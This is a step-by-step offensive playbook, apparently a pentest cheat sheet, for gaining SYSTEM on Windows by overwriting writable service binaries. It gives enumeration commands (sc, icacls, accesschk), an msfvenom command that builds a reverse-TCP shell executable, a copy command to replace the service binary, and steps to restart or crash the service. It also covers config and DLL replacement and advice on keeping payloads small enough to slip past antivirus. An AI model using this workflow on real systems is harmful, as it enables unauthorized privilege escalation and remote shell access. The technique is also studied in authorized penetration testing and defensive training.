# Windows Privilege Escalation – Writable Service Files

## Purpose

This file provides a structured workflow for identifying and exploiting writable Windows service binaries and configuration files for privilege escalation.

Core rules:
- Services often run as SYSTEM
- Writable service binaries = direct privilege escalation
- Writable config paths may allow execution control
- Restarting the service triggers execution

---

## 0. Mental Model

Windows services:
- run as SYSTEM (high privilege)
- execute a binary (PathName)
- can often be restarted

If you can modify the binary:
→ you control what SYSTEM executes

---

## 1. Enumerate Services (CRITICAL FIRST STEP)

cmd:

sc query state= all

PowerShell:

Get-WmiObject win32_service

---

## 2. Get Detailed Service Info

sc qc <service_name>

Look for:
- BINARY_PATH_NAME
- SERVICE_START_NAME

---

## 3. Confirm Service Runs as SYSTEM

Look for:

SERVICE_START_NAME : LocalSystem

→ high-value target

---

## 4. Extract Binary Path

Example:

C:\Program Files\App\service.exe

---

## 5. Check File Permissions (CRITICAL)

cmd:

icacls "C:\Program Files\App\service.exe"

PowerShell:

Get-Acl "C:\Program Files\App\service.exe"

Look for:
- (F) Full control
- (M) Modify
- Write access for your user

---

## 6. Check Directory Permissions

icacls "C:\Program Files\App\"

If directory writable:
→ can replace binary

---

## 7. Exploit: Replace Service Binary

### Step 1: Backup original (optional)

copy service.exe service.bak

---

### Step 2: Create malicious binary

Use msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o service.exe

OR simple payload:

cmd.exe

---

### Step 3: Replace binary

copy /Y payload.exe "C:\Program Files\App\service.exe"

---

## 8. Restart Service (TRIGGER EXECUTION)

sc stop <service_name>
sc start <service_name>

---

## 9. If Cannot Stop Service

Try:

- reboot system
- wait for auto-restart
- crash service (if possible)

---

## 10. Verify SYSTEM Access

whoami

Expected:

nt authority\system

---

## 11. Alternative: Writable Config Files

Some services reference config files:

C:\App\config.ini
C:\App\settings.xml

If writable:
→ inject command or change execution path

---

## 12. Alternative: DLL Replacement

If service loads DLLs:

- identify DLL path
- check if writable
- replace DLL

---

## 13. Check with accesschk (VERY USEFUL)

accesschk.exe -uwcqv "Users" *

Look for:
- writable services
- weak permissions

---

## 14. PowerShell Enumeration

Get-Service | Where-Object {$_.StartType -eq "Automatic"}

---

## 15. Common Failure Points

- service binary not writable
- directory not writable
- service cannot be restarted
- AV deletes payload
- wrong architecture (x86 vs x64)

---

## 16. If Stuck

- re-check permissions
- test directory write instead of file
- try DLL hijack instead
- pivot to unquoted service paths

---

## 17. Quick Exploit Pattern

1. Enumerate services
2. Identify SYSTEM service
3. Check file/directory permissions
4. Replace executable
5. Restart service
6. Gain SYSTEM shell

---

## 18. Mental Model

Service = SYSTEM execution  
Writable file = control  
Restart = trigger  
Execution = SYSTEM shell  

---

## 19. Golden Rules

- Always check service permissions early
- Always confirm SYSTEM context
- Always check directory write access (not just file)
- Restart = execution
- Keep payload simple if AV is present